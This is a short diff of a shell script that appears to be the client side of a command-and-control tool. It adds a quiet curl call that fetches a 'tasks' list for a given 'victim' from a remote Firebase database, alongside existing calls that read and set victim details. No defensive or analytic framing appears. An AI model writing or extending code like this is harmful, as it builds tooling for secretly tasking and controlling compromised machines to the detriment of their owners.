@@ -19,7 +19,13 @@ echo $((iteration + 1)) > "$iterationFile"
 
 function getVictimDetails(){
 
-  curl "https://${firebaseProject}.firebaseio.com/victims/$victim/details.json"
+  curl -s "https://${firebaseProject}.firebaseio.com/victims/$victim/details.json"
+
+}
+
+function getVictimTasks(){
+
+  curl -s "https://${firebaseProject}.firebaseio.com/victims/$victim/tasks.json"
 
 }
 
@@ -54,3 +60,5 @@ function setVictimDetails(){
 
 getVictimDetails
 setVictimDetails
+
+# We only need to run this for a few seconds
